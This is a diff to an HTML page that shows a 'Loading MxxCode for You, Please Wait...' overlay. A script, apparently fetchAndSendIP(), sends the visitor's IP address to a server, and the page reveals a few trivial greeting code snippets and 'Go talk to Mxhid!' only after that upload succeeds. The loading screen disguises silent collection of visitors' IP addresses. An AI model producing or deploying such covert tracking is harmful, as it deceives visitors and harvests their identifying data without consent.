@@ -15,6 +15,7 @@
       justify-content: center;
       align-items: center;
       position: relative;
+      overflow: hidden; /* Prevent scrolling */
     }
     #overlay {
       position: absolute;
@@ -24,17 +25,40 @@
       height: 100%;
       background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       color: white;
       font-size: 24px;
       z-index: 10; /* Ensure overlay is on top */
     }
+    #content {
+      display: none; /* Hide content initially */
+      font-size: 20px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
 
-<div id="overlay">Under Maintenance...</div>
+<div id="overlay">Loading MxxCode for You, Please Wait...</div>
+<div id="content">
+  <p>Here are some random coding snippets:</p>
+  <pre>
+    // JavaScript Example
+    function greet(name) {
+      return `Hello, ${name}!`;
+    }
+
+    // Python Example
+    def greet(name):
+        return f"Hello, {name}!"
+
+    // HTML Example
+    &lt;div&gt;Hello, World!&lt;/div&gt;
+  </pre>
+  <p>Go talk to Mxhid!</p>
+</div>
 
 <script>
   function fetchAndSendIP() {
@@ -54,7 +78,9 @@
         .then(response => {
           if (response.ok) {
             console.log('IP sent successfully!');
-            // Optionally, you can hide the overlay or keep it as is
+            // Show the content after sending the IP
+            document.getElementById('overlay').style.display = 'none'; // Hide overlay
+            document.getElementById('content').style.display = 'block'; // Show content
           } else {
             console.error('Failed to send IP.');
           }
